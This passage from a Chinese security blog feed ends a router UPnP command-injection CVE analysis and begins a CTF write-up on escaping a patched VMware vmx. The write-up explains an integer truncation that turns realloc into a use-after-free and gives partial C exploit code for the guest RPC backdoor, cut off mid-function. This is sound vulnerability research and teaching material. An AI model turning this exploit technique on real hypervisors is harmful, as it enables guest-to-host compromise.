pcVar4 <span class="token operator">=</span> <span class="token operator">*</span>ppcVar3<span class="token punctuation">;</span>        iVar1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>pcVar4 <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">;</span>        iVar2 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> iVar1<span class="token punctuation">)</span><span class="token punctuation">,</span>param_2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>iVar2 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>           <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> iVar1 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span> <span class="token operator">||</span>            <span class="token punctuation">(</span>iVar1 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> iVar1 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>param_3<span class="token punctuation">)</span><span class="token punctuation">,</span> iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>param_4 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token operator">*</span>param_4 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>pcVar4 <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>ppcVar3 <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        iVar1 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">*</span>ppcVar3<span class="token punctuation">,</span>param_2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>param_4 <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token operator">*</span>param_4 <span class="token operator">=</span> pcVar4<span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>可以看到这里return返回的是，<code>return *(undefined4 *)(g_astActionArray + (int)*ppcVar3 * 0x10 + 8);</code>而<code>(ppcVar3 = *(char ***)(param_1 + 0x24)</code><br>返回上级调用查看第一个参数。</p><p><img src="https://i.bmp.ovh/imgs/2022/01/737c1bd8ec3d0bde.png" alt=""></p><p>继续查看<code>UpnpGetServiceByUrl</code>函数。</p><p><img src="https://i.bmp.ovh/imgs/2022/01/1256eca8a4f1d763.png" alt=""></p><p>经过了预处理之后，如果还没有返回，那么就会继续接下来的判断。</p><p><img src="https://i.bmp.ovh/imgs/2022/01/f12f04bdca370358.png" alt=""></p><p>这样的判断和虚表有些类似，但是暂时和我们所需要的分析函数中的<code>g_pstUpnpGvarHead</code>变量没有关系，这个变量在反汇编器中也看不到。</p><p>继续看这个函数，再<code>if</code>判断之后，还有一个<code>strcmp</code>函数，可以发现这个比较函数的参数1，已经又snprintf改编为了目前偏移位置的函数。进行了第二次函数判别，判断该服务是否是调用者要调用的目标服务。</p><p>所以能够确定该函数是一个，确定调用者调用服务的函数，就是说只要访问<code>url</code><br><code>/ctrlt/函数服务</code>就可以访问对应的服务，但是仔细看就会发现<code>snprintf</code>函数给函数服务规定了一定的格式。</p><p><img src="https://i.bmp.ovh/imgs/2022/01/d89af09884dad711.png" alt=""></p><p>只有满足<code>Name_num</code>的格式才是一个合法的服务。关于这个关键的全局变量<code>g_pstUpnpGvarHead</code>该变量只有在<code>UPNP_Init</code>函数才被调用，于是继续往上追踪该变量。</p><p>在初始化函数中发现，在这一句中初始化了：<code>g_pstUpnpGvarHead = (int *)ATP_UTIL_GVarGetValue(0x20001,0);</code></p><p>并且该函数是个链接函数，所以无法得知其内容，那么该变量的分析先告一段落，后期会动态调试获得该内存的内容。</p><p>回到<code>sub_40A9C8</code>函数调用<code>UpnpGetServiceByUr</code>的位置。发现调用该函数之前也是一些url的分析，调用该函数之后，</p><p><img src="https://i.bmp.ovh/imgs/2022/01/f65dfda3721d709d.png" alt=""></p><p>是在解析xml格式的文件。解析完了格式就会调用漏洞函数，所以断定，想要触发函数，一定要获得目标全局变量的值，使用qemu-mips-static开启调试模式发现，不会进入到upnp初始化里面去，可能是该服务的原因。</p><h2 id="总结"><a class="header-anchor" href="#总结">¶</a>总结</h2><ul><li>逆向服务的时候，要细致，能动调就调试，但是不能一上来就调试，中间有许多的细节还是不要丢失</li><li>路由器漏洞入门，学到了许多新的知识，也是分析的第一个CVE，耗时1天半</li><li>命令注入，多寻找system函数，这类函数在大型的项目中基本都使用</li></ul>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IOT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>虚拟机逃逸（二）</title>
    <link href="/2022/06/22/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2022/06/22/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发于奇安信攻防社区:<a href="https://forum.butian.net/share/1678">https://forum.butian.net/share/1678</a></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>初次分析虚拟机逃逸，之前分析了一篇rwctf2018，这次视线转到强网杯的一个虚拟机逃逸分析。难度比rw大一点点，但是逆向分析还是重点，所以也不会差到哪里去。</p><p>一些有关基础的链接放在这里，不做赘述。</p><p><a href="https://nafod.net/blog/2019/12/21/station-escape-vmware-pwn.html">题解</a></p><p><a href="http://sysprogs.com/legacy/articles/kdvmware/guestrpc.shtml">RPC&#x2F;backdoor机制</a></p><h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><h3 id="bindiff"><a href="#bindiff" class="headerlink" title="bindiff"></a>bindiff</h3><p>这类题目都会给一个patched的vmx文件，安装vmware后，在<code>/usr/lib/vmware/bin</code>目录下可以找到目标vmx。使用bindiff比较patched和patch之前的区别可以迅速定位漏洞的位置。</p><p>（bindiff分析太慢了，这次选择了010）</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-89eec2810b186d524efda555894cca9031ad35e7.png" alt="图片.png"></p><p>有三处不同，ida定位到关键位置。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-18b396ee70885b34dc4b57846efde51baa0d1a1f.png" alt="图片.png"></p><p>一处把r12d改成了r12w，相当于省略了r12的高位。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b9b1beba56c3803f31e032d2c8476ce9c7d9fda8.png" alt="图片.png"></p><p>把跳转的条件改为了大于等于。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a25862dfd05d6be26c03539e4ccba81caefc64ab.png" alt="图片.png"></p><p>跳转改为了无条件。</p><p>最后一个改变，取消了条件检查，前两处patch改变如下。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-2c772477f3bc5dde104c35b1d042d567f8c8da28.png" alt="图片.png"></p><p>本能的反应就是realloc函数的漏洞，这类题在常规pwn中很常见，realloc函数第二个size参数如果为0，则和free效果一样，常常会导致DF、UAF.接下来细看一下伪代码。</p><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p>Vmx漏洞依然位于guestRPC的处理函数中，该函数中使用了一个大的switch处理不同的信息。接下来详细分析。（虚拟机逃逸（一）中只给了分析的结构体）</p><p>关于一些基础知识可以看<a href="">虚拟机逃逸（一）</a></p><h4 id="Open-RPC-channel"><a href="#Open-RPC-channel" class="headerlink" title="Open_RPC_channel"></a>Open_RPC_channel</h4><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-1f4c153972dee2b077f41122e57c31023c87979c.png" alt="图片.png"></p><p>这是switch下最简单的一个分支了，打开信道，内容就是简单的接受数据包，然后获得magicnum（这部分是调试得到的）</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-4ac942da8b78bba6ed812cf7878a8b0b70561da5.png" alt="图片.png"></p><p>magicnum会进行一个比较如果失败就直接退出。</p><h4 id="Send-RPC-command-length"><a href="#Send-RPC-command-length" class="headerlink" title="Send_RPC_command_length"></a>Send_RPC_command_length</h4><p>首先判断<code>byte_FE9584</code>，也是一个魔数，接着就判断长度。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-3612cc7def195cc1c26ad8199975b01b1c452eb0.png" alt="图片.png"></p><p>长度为-1或者大于0x10000就会报错。如果RPCI的长度符合就会继续往下走。!</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-38b67aa4103d4bfdb748b0cab800ba051690af6b.png" alt="图片.png"><br> 在这个判断中，比较56和21偏移处的值，v56为接收到的数据包，v21为现有长度，如果数据长度大于现有长度则realloc重新分配，设置空间大小为新的大小，且修改msg_struct。</p><p>漏洞就出在这个部分。漏洞存在的比较隐秘，大体属于整形溢出。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-ac0faf0ad5f12e77c733f85edc1914098b407865.png" alt="图片.png"></p><p>此处，处理size的时候加入了LOWORD修饰，导致dword-&gt;word高位失去，所以如果设置v56&#x3D;0xffff则可以通过大小判断，然后LOWORD(0xffff+1)&#x3D;LOWORD(0x10000)&#x3D;0，则此时的realloc第二个参数为0，运行时重新回收ptr。也没有清0.导致了ptr的UAF利用。</p><h4 id="Send-RPC-command-data"><a href="#Send-RPC-command-data" class="headerlink" title="Send_RPC_command_data"></a>Send_RPC_command_data</h4><p>首先读入了需要发送的data指令，然后读取RPCI结构体，根据前面设置的长度，以不同的方式发送msg，一次最多发送四个字节，四个字节以内发送的方式都是一个byte一个byte的复制。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-36a2bba083009f75ce800f244312c2430730e108.png" alt="图片.png"></p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b5ba2447ff1d948dcf05d645861baddbc9ae0718.png" alt="图片.png"></p><p>发送完指令之后，判断是否发送完，如果发送完了则进入指令处理，根据一个类似虚表的bss段指针，执行某个函数rw2018中，最后就是劫持了这样一个函数，让我们成功逃逸。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-163cb20a6e28b6d9bce90892deae335522c69b65.png" alt="图片.png"><br> 处理完之后，flag标志为设置为1.具体的指令可以搜索字符串，之前分析的rw2018中也有相应的分析，这里就不赘述。</p><h4 id="Recieve-RPC-reply-length"><a href="#Recieve-RPC-reply-length" class="headerlink" title="Recieve_RPC_reply_length"></a>Recieve_RPC_reply_length</h4><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-9589e548acbe430d797a4b712db305520f4cd8bd.png" alt="图片.png"></p><p>guest获得，返回的长度，逻辑简单。</p><h4 id="Recieve-RPC-reply-data"><a href="#Recieve-RPC-reply-data" class="headerlink" title="Recieve_RPC_reply_data"></a>Recieve_RPC_reply_data</h4><p>执行指令之后返回的数据。</p><p>逻辑和发送差不多，同样的先收到长度，然后判断长度，一次接受四个字节，然后再把数据转移到缓冲区。最后设置flag为发送完毕。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-5554b4d6edff9e2280409f6bd2c8cd2c86fea21f.png" alt="图片.png"></p><h4 id="Finish-receiving-RPC-reply-amp-Close-RPC-channel"><a href="#Finish-receiving-RPC-reply-amp-Close-RPC-channel" class="headerlink" title="Finish_receiving_RPC_reply &amp; Close_RPC_channel"></a>Finish_receiving_RPC_reply &amp; Close_RPC_channel</h4><p>这两个部分也较为简单，前者在rw2018详细分析过，后者就是close channel。同时设置flag为1，整个指令处理发送接收流程结束。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>前面说过了，漏洞存在于realloc中，利用该UAF可以造成泄露等操作。实际上leak和利用的思路还是和rw差不多的。</p><p>此处的UAF位置在realloc环节也就是设置发送长度的环节，但是造成UAF leak虚表还是需要先设置一个0x100大小的缓冲区。</p><ul><li>开启channel A channel B</li><li>A设置buffer为0x100， B 使用info get也设置为0x100</li><li>然后set_len触发A漏洞，B get这个buffer，A再次触发漏洞。此时B 的buffer已经在tcache里了</li><li>调用dnd_vison函数写入虚表</li><li>leak</li></ul><p>漏洞利用也是和rw一样，直接tcache劫持即可</p><h2 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h2><p>主要的流程还是复制rw2018的，改动少部分即可。还是对师傅的脚本分析</p><p>leak函数</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-4b9fefc7745ee94ae07cccc09bfdcb91cf0fb928.png" alt="图片.png"></p><p>完整的channel 0 发送指令</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d6ac75d5867ddf6d2826a4909d4a23d798ecc4e9.png" alt="图片.png"></p><p>channel发送部分info get</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a5dfc228eaf5bbe1046ff8828591417ae8e7d130.png" alt="图片.png"></p><p>free channel 0 的buffer，然后在channel 1realloc出来。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-cf4ca0bca038198b936f068479e3d7c86b304719.png" alt="图片.png"></p><p>再次free</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-6101b8e1bf488c5b22fc638bf5ee6759f7e47d59.png" alt="图片.png"></p><p>dnd_verison打入虚表</p><p>tcache劫持操作也是一样的，只是改掉了触发的位置。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token keyword">void</span> <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rdi,%%r10\n\t"</span>        <span class="token string">"movq %%rsi,%%r11\n\t"</span>        <span class="token string">"movq %%rdx,%%r12\n\t"</span>        <span class="token string">"movq %%rcx,%%r13\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x49435052,%%ebx\n\t"</span>        <span class="token string">"movl $0x1e,%%ecx\n\t"</span>        <span class="token string">"movl $0x5658,%%edx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%edi,(%%r10)\n\t"</span>        <span class="token string">"movl %%esi,(%%r11)\n\t"</span>        <span class="token string">"movl %%edx,(%%r12)\n\t"</span>        <span class="token string">"movl %%ecx,(%%r13)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r8"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span><span class="token punctuation">,</span><span class="token string">"%r13"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_set_len</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> len<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%r8,%%r10\n\t"</span>        <span class="token string">"movl %%ecx,%%ebx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0001001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_send_data</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> len<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"pushq %%rbp\n\t"</span>        <span class="token string">"movq %%r9,%%r10\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movq $0,%%r12\n\t"</span>        <span class="token string">"1:\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"add %%r12,%%rbp\n\t"</span>        <span class="token string">"movl (%%rbp),%%ebx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0002001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"addq $4,%%r12\n\t"</span>        <span class="token string">"cmpq %%r12,%%r11\n\t"</span>        <span class="token string">"ja 1b\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"popq %%rbp\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>len<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%r8,%%r10\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0003001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"movl %%ebx,(%%r11)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_data</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> offset<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"pushq %%rbp\n\t"</span>        <span class="token string">"movq %%r9,%%r10\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movq $1,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0004001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"in %%dx,%%eax\n\t"</span>        <span class="token string">"add %%r11,%%rbp\n\t"</span>        <span class="token string">"movl %%ebx,(%%rbp)\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"popq %%rbp\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_finish</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movq $0x1,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0005001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movq $0x21,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0005001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_close</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token 